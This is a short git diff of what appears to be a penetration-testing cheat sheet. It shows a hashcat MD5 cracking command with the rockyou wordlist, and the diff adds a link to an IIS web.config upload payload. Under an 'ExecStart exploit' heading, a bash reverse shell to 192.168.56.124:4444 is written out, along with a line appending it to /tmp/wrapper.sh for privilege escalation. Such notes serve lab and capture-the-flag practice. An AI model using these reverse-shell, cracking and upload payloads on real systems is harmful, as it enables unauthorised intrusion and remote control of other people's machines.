@@ -44,6 +44,9 @@ hashcat -m 0 -a 0 md5.txt /usr/share/wordlists/rockyou.txt
 
 ## Payloads
 
+#Payload Links
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config
+
 ### ExecStart exploit
 ``` ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.124/4444 0>&1'
 # To file: echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.124/4444 0>&1'" >> /tmp/wrapper.sh
